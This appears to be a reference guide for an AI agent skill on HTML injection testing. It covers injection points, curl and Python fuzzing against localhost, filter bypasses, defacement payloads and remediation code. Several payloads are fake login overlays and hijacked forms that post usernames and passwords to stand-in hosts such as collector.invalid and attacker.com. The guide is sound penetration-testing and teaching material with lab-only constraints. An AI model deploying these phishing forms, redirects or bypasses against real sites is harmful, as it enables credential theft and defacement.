# HTML Injection Testing - Detailed Guide

> This file contains the detailed procedure and reference material extracted from `SKILL.md` for focused loading. The root skill defines activation, examples, safety constraints, and limitations.

## Purpose

Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.


## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points
2. **Exploitation Proof** - Demonstrated content manipulation
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation recommendations


Use a controlled lab and synthetic credentials for form demonstrations. Do not expose an injected form to real users or collect real passwords. Stored payloads require explicit cleanup verification. Reflection in response text is only a candidate: inspect parsed DOM, context and browser behavior; curl/grep cannot prove rendering or exploitability. Every automated request must stay within the exact authorized origin, bounded count/rate and response-size budget.

## Core Workflow

### Phase 1: Understanding HTML Injection

HTML injection occurs when user input is reflected in web pages without proper sanitization:

```html
<!-- Vulnerable code example -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- Attack input -->
?name=<h1>Injected Content</h1>

<!-- Rendered output -->
<div>
    Welcome, <h1>Injected Content</h1>
</div>
```

Key differences from XSS:
- HTML injection: Only HTML tags are rendered
- XSS: JavaScript code is executed
- HTML injection is often stepping stone to XSS

Attack goals:
- Modify website appearance (defacement)
- Create fake login forms (phishing)
- Inject malicious links
- Display misleading content

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:

```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic HTML Injection Testing

Test with simple HTML tags:

```html
<!-- Basic text formatting -->
<h1>Test Injection</h1>
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
<font color="red">Red Text</font>

<!-- Structural elements -->
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<p>Injected paragraph</p>
<br><br><br>Line breaks

<!-- Links -->
<a href="https://collector.invalid">Click Here</a>
<a href="https://collector.invalid">Legitimate Link</a>

<!-- Images -->
<img src="https://collector.invalid/image.png">
<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
```

Testing workflow:
```bash
# Test basic injection
curl --get --data-urlencode 'q=<h1>Test</h1>' "http://127.0.0.1:8000/search"

# Check if HTML renders in response
curl --get --data-urlencode 'q=<b>Bold</b>' "http://127.0.0.1:8000/search" | grep -i "bold"

# Test in URL-encoded form
curl "http://127.0.0.1:8000/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="https://collector.invalid/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="https://collector.invalid/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL injection -->
http://127.0.0.1:8000/welcome?name=<h1>Welcome%20Admin</h1><form%20action="https://collector.invalid/steal">

<!-- Search result injection -->
http://127.0.0.1:8000/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST injection test
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://127.0.0.1:8000/submit

# Form field injection
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://127.0.0.1:8000/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://127.0.0.1:8000/page/<h1>Injected</h1>

<!-- Path-based injection -->
http://127.0.0.1:8000/users/<img src=x>/profile
```

### Phase 5: Phishing Attack Construction

Create convincing phishing forms:

```html
<!-- Fake login form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Your session has expired. Please log in again.</p>
    <form action="https://collector.invalid/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- Synthetic form submission demonstration; CSS URL alone cannot read typed values -->
<style>
    input { background: url('https://collector.invalid/log?data=') }
</style>
<form action="https://collector.invalid/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

URL-encoded phishing link:
```
http://127.0.0.1:8000/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### Phase 6: Defacement Payloads

Website appearance manipulation:

```html
<!-- Full page overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- Content replacement -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- Image injection -->
<img src="https://collector.invalid/defaced.jpg"
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Marquee injection (visible movement) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('https://collector.invalid/static-marker') }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('https://collector.invalid/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=https://collector.invalid/phish">

<!-- Adding a permissive meta policy cannot relax an existing header CSP -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="https://collector.invalid/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="https://collector.invalid/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="https://collector.invalid/track" style="display:none"></iframe>
```

### Phase 8: Bypass Techniques

Evade basic filters:

```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Double encoding -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode encoding -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Attribute-based -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### Phase 9: Automated Testing

#### Using Burp Suite

```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
7. Manually verify successful injections
```

#### Using OWASP ZAP

```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://127.0.0.1:8000/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='https://collector.invalid'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='https://collector.invalid'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"

    try:
        response = requests.get(url, timeout=5, allow_redirects=False)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### Phase 10: Prevention and Remediation

Secure coding practices:

```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// strip_tags is not an XSS defense and allowed tags retain unsafe attributes.
// For intended rich HTML, use a maintained HTML sanitizer with a restrictive policy.
```

```python
# Python: HTML escape
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules


## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="collector.invalid">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="collector.invalid">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| HTML entities | `&#60;h1&#62;` = `<h1>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |


Encoding examples depend on the application decoding pipeline. CSS does not execute JavaScript concatenation, character references are not universally reparsed as markup, and split tag names are not equivalent to intact names. Treat examples as hypotheses, not guaranteed filter bypasses.

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |
